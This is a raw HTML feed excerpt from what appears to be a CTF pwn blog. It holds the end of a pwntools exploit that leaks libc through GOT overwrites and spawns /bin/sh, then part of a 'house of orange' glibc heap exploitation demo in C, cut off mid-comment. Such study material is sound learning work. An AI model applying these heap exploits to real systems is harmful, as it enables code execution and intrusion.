class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">p = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size</span>):</span><br><span class="line">        p.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">        p.sendafter(<span class="string">b&#x27;size:\n&#x27;</span>,<span class="built_in">str</span>(size).encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dele</span>(<span class="params">idx</span>):</span><br><span class="line">        p.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">        p.send(<span class="built_in">str</span>(idx).encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,context</span>):</span><br><span class="line">        p.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">        p.sendline(<span class="built_in">str</span>(idx).encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">        p.send(context)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">change_name</span>(<span class="params">name</span>):</span><br><span class="line">        p.sendline(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">        p.send(name)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">change_mesg</span>(<span class="params">size,new_mesg,mesg</span>):</span><br><span class="line">        p.sendline(<span class="string">b&#x27;5&#x27;</span>)</span><br><span class="line">        p.recvuntil(<span class="string">b&#x27;saved at &#x27;</span>)</span><br><span class="line">        a = p.recvline()[:-<span class="number">1</span>]</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;leak---&gt;&#x27;</span>,a)</span><br><span class="line">        heap_addr = <span class="built_in">int</span>(a,<span class="number">16</span>)</span><br><span class="line">        payload = p64(heap_addr+<span class="number">0xb0</span>+<span class="number">0xd0</span>)</span><br><span class="line">        mesg = payload + mesg</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;----&gt;&#x27;</span>,<span class="built_in">hex</span>(heap_addr))</span><br><span class="line">        p.send(<span class="built_in">str</span>(size).encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">        p.send(new_mesg)</span><br><span class="line">        p.send(mesg)</span><br><span class="line">        <span class="keyword">return</span> a</span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">b&#x27;a&#x27;</span></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;writer:\n&#x27;</span>,payload1)</span><br><span class="line">payload2 = <span class="string">b&#x27;a&#x27;</span></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;book?\n&#x27;</span>,payload2)</span><br><span class="line">add(<span class="number">0xC8</span>)</span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0x6020A0</span>-<span class="number">0x10</span>)</span><br><span class="line">heap_addr = change_mesg(<span class="number">200</span>,<span class="string">b&#x27;11&#x27;</span>,payload)</span><br><span class="line">heap_addr = <span class="built_in">int</span>(heap_addr,<span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;----&gt;&#x27;</span>,<span class="built_in">hex</span>(heap_addr))</span><br><span class="line"></span><br><span class="line">payload = p64(heap_addr-<span class="number">0x10</span>)+p64(<span class="number">0x6020A0</span>+<span class="number">0x8</span>)</span><br><span class="line">payload +=p64(<span class="number">0</span>)+p64(<span class="number">0x6020A0</span>-<span class="number">0x10</span>)</span><br><span class="line">change_name(payload)</span><br><span class="line">add(<span class="number">0xb0</span>)</span><br><span class="line">add(<span class="number">0xb0</span>)</span><br><span class="line"></span><br><span class="line">free_got = <span class="number">0x602018</span></span><br><span class="line">puts_got = <span class="number">0x602020</span></span><br><span class="line">atoi_got = <span class="number">0x602060</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x40</span>+p64(heap_addr+<span class="number">0xb0</span>+<span class="number">0xc0</span>+<span class="number">0xd0</span>)</span><br><span class="line">payload+=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>+p64(free_got)+p64(puts_got)</span><br><span class="line">payload+=p64(atoi_got)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">2</span>,payload)</span><br><span class="line">edit(<span class="number">0</span>,p64(<span class="number">0x4006A0</span>))</span><br><span class="line">dele(<span class="number">1</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;delete?\n&#x27;</span>)</span><br><span class="line">puts_addr = p.recvline()[:-<span class="number">1</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;puts_addr---&gt;&#x27;</span>,puts_addr)</span><br><span class="line">puts_addr = <span class="built_in">int</span>.from_bytes(puts_addr,<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line">libc_addr = puts_addr - libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">system_addr = libc_addr + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">edit(<span class="number">2</span>,p64(system_addr))</span><br><span class="line">p.send(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h1><h2 id="chrome-v8"><a href="#chrome-v8" class="headerlink" title="chrome v8"></a>chrome v8</h2>]]></content>
    
    
    <summary type="html">前言：弱鸡pwn手刷题成长</summary>
    
    
    
    <category term="CTF" scheme="http://iyheart.github.io/categories/CTF/"/>
    
    <category term="PWN" scheme="http://iyheart.github.io/categories/CTF/PWN/"/>
    
    
  </entry>
  
  <entry>
    <title>PWN堆house of orange</title>
    <link href="http://iyheart.github.io/2025/02/13/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-orange/"/>
    <id>http://iyheart.github.io/2025/02/13/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-orange/</id>
    <published>2025-02-13T12:45:55.000Z</published>
    <updated>2025-03-25T00:28:28.422Z</updated>
    
    <content type="html"><![CDATA[<ul><li>参考文章：<a href="https://www.cnblogs.com/ZIKH26/articles/16712469.html">关于house of orange(unsorted bin attack &amp;&amp;FSOP)的学习总结 - ZikH26 - 博客园 (cnblogs.com)</a></li></ul><h1 id="相关知识"><a href="#相关知识" class="headerlink" title="相关知识"></a>相关知识</h1><ul><li>house of orange该攻击手法是在没有<code>free</code>函数的情况下，来获得一个在unsorted bin中的堆块。</li><li>漏洞成因的源码位置在<code>malloc.c</code>和<code>arena.c</code>中（glibc2.23）</li><li><code>house of orange</code>这种堆利用手法就已经开始与<code>IO</code>结合在一起了</li></ul><h2 id="相关io利用链"><a href="#相关IO利用链" class="headerlink" title="相关IO利用链"></a>相关IO利用链</h2><h2 id="top_chunk_free机制"><a href="#Top-chunk-free机制" class="headerlink" title="Top_chunk_free机制"></a>Top_chunk_free机制</h2><h1 id="实验"><a href="#实验" class="headerlink" title="实验"></a>实验</h1><details>    <summary>源码</summary><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">  The House of Orange uses an overflow in the heap to corrupt the _IO_list_all pointer</span></span><br><span class="line"><span class="comment">  It requires a leak of the heap and the libc</span></span><br><span class="line"><span class="comment">  Credit: http://4ngelboy.blogspot.com/2016/10/hitcon-ctf-qual-2016-house-of-orange.html</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   This function is just present to emulate the scenario where</span></span><br><span class="line"><span class="comment">   the address of the function system is known.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">winner</span> <span class="params">( <span class="type">char</span> *ptr)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">      The House of Orange starts with the assumption that a buffer overflow exists on the heap</span></span><br><span class="line"><span class="comment">      using which the Top (also called the Wilderness) chunk can be corrupted.</span></span><br><span class="line"><span class="comment">      </span></span><br><span class="line"><span class="comment">      At the beginning of execution, the entire heap is part of the Top chunk.</span></span><br><span class="line"><span class="comment">      The first allocations are usually pieces of the Top chunk that are broken off to service the request.</span></span><br><span class="line"><span class="comment">      Thus, with every allocation, the Top chunks keeps getting smaller.</span></span><br><span class="line"><span class="comment">      And in a situation where the size of the Top chunk is smaller than the requested value,</span></span><br><span class="line"><span class="comment">      there are two possibilities:</span></span><br><span class="line"><span class="comment">       1) Extend the Top chunk</span></span><br><span class="line"><span class="comment">       2) Mmap a new page</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">      If the size requested is smaller than 0x21000, then the former is followed.</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> *p1, *p2;</span><br><span class="line">    <span class="type">size_t</span> io_list_all, *top;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;The attack vector of this technique was removed by changing the behavior of malloc_printerr, &quot;</span></span><br><span class="line">        <span class="string">&quot;which is no longer calling _IO_flush_all_lockp, in 91e7cf982d0104f0e71770f5ae8e3faf352dea9f (2.26).\n&quot;</span>);</span><br><span class="line">  </span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Since glibc 2.24 _IO_FILE vtable are checked against a whitelist breaking this exploit,&quot;</span></span><br><span class="line">        <span class="string">&quot;https://sourceware.org/git/?p=glibc.git;a=commit;h=db3476aff19b75c4fdefbe65fcd5f0a90588ba51\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">      Firstly, lets allocate a chunk on the heap.</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">    p1 = <span class="built_in">malloc</span>(<span class="number">0x400</span><span class="number">-16</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">       The heap is usually allocated with a top chunk of size 0x21000</span></span><br><span class="line"><span class="comment">       Since we&#x27;ve allocate a chunk of size 0x400 already,</span></span><br><span class="line"><span class="comment">       what&#x27;s left is 0x20c00 with the PREV_INUSE bit set =&gt; 0x20c01.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">       The heap boundaries are page aligned. Since the Top chunk is the last chunk on the heap,</span></span><br><span class="line"><span class="comment">       it must also be page aligned at the end.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">       Also, if a chunk that is adjacent to the Top chunk is to be freed,</span></span><br><span class="line"><span class="comment">       then it gets merged with the Top chunk. So the PREV_INUSE bit of the Top chunk is always set.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">       So that means that there are two conditions that must always be true.</span></span><br><span class="line"><span class="comment">        1) Top chunk + size has to be page aligned</span></span><br><span class="line"><span class="comment">        2) Top chunk&#x27;s prev_inuse bit has to be set.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">       We can satisfy both of these conditions if we set the size of the Top chunk to be 0xc00 | PREV_INUSE.</span></span><br><span class="line"><span class="comment">       What&#x27;s left is 0x20c01</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">       Now, let&#x27;s satisfy the conditions</span></span><br><span class="line"><span class="comment">       1) Top chunk + size has to be page aligned</span></span><br><span class="line"><span class="comment">       2) Top chunk&#x27;s prev_inuse bit has to be set.</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">    top = (<span class="type">size_t</span> *) ( (<span class="type">char</span> *) p1 + <span class="number">0x400</span> - <span class="number">16</span>);</span><br><span class="line">    top[<span class="number">1</span>] = <span class="number">0xc01</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* </span></span><br><span class="line"><span class="comment">       Now we request a chunk of size larger than the size of the Top chunk.</span></span><br><span class="line"><span class="comment">       Malloc tries to service this request by extending the Top chunk</span></span><br><span class="line"><span class="comment">       This forces sysmalloc to be invoked.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">       In the usual scenario, the heap looks like the following</span></span><br><span class="line"><span class="comment">          |------------|------------|------...----|</span></span><br><span class="line"><span class="comment">          |    chunk   |    chunk   | Top  ...    |</span></span><br><span class="line"><span class="comment">          |------------|------------|------...----|</span></span><br><span class="line"><span class="comment">      heap start                              heap end</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">       And the new area that gets allocated is contiguous to the old heap end.</span></span><br><span class="line"><span class="comment">       So the new size of the Top chunk is the sum of the old size and the newly allocated size.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">       In order to keep track of this change in size, malloc uses a fencepost chunk,</span></span><br><span class="line"><span class="comment">       which is basically a temporary chunk.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">       After the size of the Top chunk has been updated, this chunk gets freed.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">       In our scenario however, the heap looks like</span></span><br><span class="line"><span class="comment">          |------------|------------|------..--|--...--|---------|</span></span><br><span class="line"><span class="comment">          |    chunk   |    chunk   | Top  ..  |  ...  | new Top |</span></span><br><span class="line"><span class="comment">          |------------|------------|------..--|--...--|---------|</span></span><br><span class="line"><span class="comment">     heap start                            heap end</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">       In this situation, the new Top will be starting from an address that is adjacent to the heap end.</span></span><br><span class="line"><span class="comment">       So the area between the second chunk and the heap end is unused.</span></span><br><span class="line"><span class="comment">       And the old Top chunk gets freed.</span></span><br><span class="line"><span class="comment">       Since the size of the Top chunk, when it is freed, is larger than the fastbin sizes,</span></span><br><span class="line"><span class="comment">       it gets added to list of unsorted bins.</span></span><br><span class="line"><span class="comment">       Now we request a chunk of size larger than the size of the top chunk.</span></span><br><span class="line"><span class="comment">       This forces sysmalloc to be invoked.</span></span><br><span class="line"><span class="comment">       And ultimately invokes _int_free</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">       Finally the heap looks like this:</span></span><br><span class="line"><span class="comment">          |------------|------------|------..--|--...--|---------|</span></span><br><span class="line"><span class="comment">          |    chunk   |    chunk   | free ..  |  ...  | new Top |</span></span><br><span class="line"><span class="comment">          |------------|------------|------..--|--...--|---------|</span></span><br><span class="line"><span class="comment">     heap start                                             new heap end</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">    p2 = <span class="built_in">malloc</span>(<span class="number">0x1000</span>);</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">      Note that the above chunk will be allocated in a different page</span></span><br><span class="line"><span class="comment">      that gets mmapped. It will be placed after the old heap&#x27;s end</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">      Now we are left with the old Top chunk that is freed and has been added into the list of unsorted bins</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">      Here starts phase two of the attack. We assume that we have an overflow into the old</span></span><br><span class="line"><span class="comment">      top chunk so we could overwrite the chunk&#x27;s size.</span></span><br><span class="line"><span class="comment">      For the second phase we utilize this overflow again to overwrite the fd and bk pointer</span></span><br><span class="line"><span class="comment">      of this chunk in the unsorted bin list.</span></span><br><span class="line"><span class="comment">      There are two common ways to exploit the current state:</span></span><br><span class="line"><span class="comment">        - Get an allocation in an *arbitrary* location by setting the pointers accordingly (requires at least two allocations)</span></span><br><span class="line"><span class="comment">        - Use the unlinking of the chunk for an *where*-controlled write of the</span></span><br><span class="line"><span class="comment">          libc&#x27;s main_arena unsorted-bin-list. (requires at least one allocation)</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">      The former attack is pretty straight forward to exploit, so we will only elaborate</span></span><br><span class="line"><span class="comment">      on a variant of the latter, developed by Angelboy in the blog post linked above.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">      The attack is pretty stunning, as it exploits the abort call itself, which</span></span><br><span class="line"><span class="comment">      is triggered when the libc detects any bogus state of the heap.</span></span><br><span class="line"><span class="comment">      Whenever abort is triggered, it will flush all the file pointers by calling</span></span><br><span class="line"><span class="comment">      _IO_flush_all_lockp. Eventually, walking through the linked list in</span></span><br><span class="line"><span class="comment">      _IO_list_all and calling _IO_OVERFLOW on them.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">      The idea is to overwrite the _IO_list_all pointer with a fake file pointer, whose</span></span><br><span class="line"><span class="comment">      _IO_OVERLOW points to system and whose first 8 bytes are set to &#x27;/bin/sh&#x27;, so</span></span><br><span class="line"><span class="comment">      that calling _IO_OVERFLOW(fp, EOF) translates to system(&#x27;/bin/sh&#x27;).</span></span><br><span class="line"><span class="comment">      More about file-pointer exploitation can be found here:</span></span><br><span class="line"><span class="comment">      https://outflux.net/blog/archives/2011/12/22/abusing-the-file-structure/</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">      The address of the _IO_list_all can be calculated from the fd and bk of the free chunk, as they</span></span><br><span class="line"><span class="comment">      currently point to the libc&#x27;s main_arena.</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">    io_list_all = top[<span class="number">2</span>] + <span class="number">0x9a8</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">      We plan to overwrite the fd and bk pointers of the old top,</span></span><br><span class="line"><span class="comment">      which has now been added to the unsorted bins.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">      When malloc tries to satisfy a request by splitting this free chunk</span></span><br><span class="line"><span class="comment">      the value at chunk-&gt;bk-&gt;fd gets overwritten with the address of the unsorted-bin-list</span></span><br><span class="line"><span class="comment">      in libc&#x27;s main_arena.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">      Note that this overwrite occurs before the sanity check and therefore, will occur in any</span></span><br><span class="line"><span class="comment">      case.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">      Here, we require that chunk-&gt;bk-&gt;fd to be the value of _IO_list_all.</span></span><br><span class="line"><span class="comment">      So, we should set chunk-&gt;bk to be _IO_list_all - 16</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"> </span><br><span class="line">    top[<span class="number">3</span>] = io_list_all - <span class="number">0x10</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">      At the end, the system function will be invoked with the pointer to this file pointer.</span></span><br><span class="line"><span class="comment">      If we fill the first 8 bytes with /bin/sh, it is equivalent to system(/bin/sh)</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">memcpy</span>( ( <span class="type">char</span> *) top, <span class="string">&quot;/bin/sh\x00&quot;</span>, <span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">      The function _IO_flush_all_lockp iterates through the file pointer linked-list</span></span><br><span class="line"><span class="comment">      in _IO_list_all.</span></span><br><span class="line"><span class="comment">      Since we can only overwrite this address with main_arena&#x27;s unsorted-bin-list,</span></span><br><span class="line"><span class="comment">      the idea is to get control over the memory at the corresponding fd-ptr.</span></span><br><span class="line"><span class="comment">      The address of the next file pointer is located at base_address+0x68.</span></span><br><span class="line"><span class="comment">      This corresponds to smallbin-4, which holds all the smallbins of</span></span><br><span class="line"><span class="comment">      sizes between 90 and 98. For further information about the libc&#x27;s bin organisation</span></span><br><span class="line"><span class="comment">      see: https://sploitfun.wordpress.com/2015/02/10/understanding-glibc-malloc/</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">      Since we overflow the old top chunk, we also control it&#x27;s size field.</span></span><br><span class="line"><span class="comment">      Here it gets a little bit tricky, currently the old top chunk is in the</span></span><br><span class="line"><span class="comment">      unsortedbin list. For each allocation, malloc tries to serve the chunks</span></span><br><span class="line"><span class="comment">      in this list first, therefore, iterates over the list.</span></span><br><span class="line"><span class="comment">      Furthermore, it will sort all non-fitting chunks into the corresponding bins.</span></span><br><span class="line"><span class="comment">      If we set the size to 0x61 (97) (prev_inuse bit has to be set)</span></span><br><span class="line"><span class="comment">      and trigger an non fitting smaller allocation, malloc will sort the old chunk into the</span></span><br><span class="line"><span class="comment">      smallbin-4. Since this bin is currently empty the old top chunk will be the new head,</span></span><br><span class="line"><span class="comment">      therefore, occupying the smallbin[4] location in the main_arena and</span></span><br><span class="line"><span class="comment">      eventually representing the fake file pointer&#x27;s fd-ptr.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">      In addition to sorting, malloc will also perform certain size checks on them,</span></span><br><span class="line"><span class="comment">      so after sorting the old top chunk and following the bogus fd pointer</span></span><br><span class="line"><span class="comment">      to _IO_list_all, it will check the corresponding size field, detect</span></span><br><span class="line"><span class="comment">      that the size is smaller than MINSIZE &quot;size &lt;= 2 * SIZE_SZ&quot;</span></span><br><span class="line"><span class="comment">      and finally triggering the abort call that gets our chain rolling.</span></span><br><span class="line"><span class="comment">      Here is the corresponding code in the libc:</span></span><br><span class="line"><span class="comment">      https://code.woboq.org/userspace/glibc/malloc/malloc.c.html#3717</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">    top[<span class="number">1</span>] = <span class="number">0x61</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">      Now comes the part where we satisfy the constraints on the fake file pointer</span></span><br><span class="line"><span class="comment">      required by the function _IO_flush_all_lockp and tested here:</span></span><br><span class="line"><span class="comment">      https://code.woboq.org/userspace/glibc/libio/genops.c.html#813</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">      We want to satisfy the first condition:</span></span><br><span class="line"><span class="comment">      fp-&gt;_mode &lt;= 0 &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">    FILE *fp = (FILE *) top;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">      1. Set mode to 0: fp-&gt;_mode &lt;= 0</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">    fp-&gt;_mode = <span class="number">0</span>; <span class="comment">// top+0xc0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">      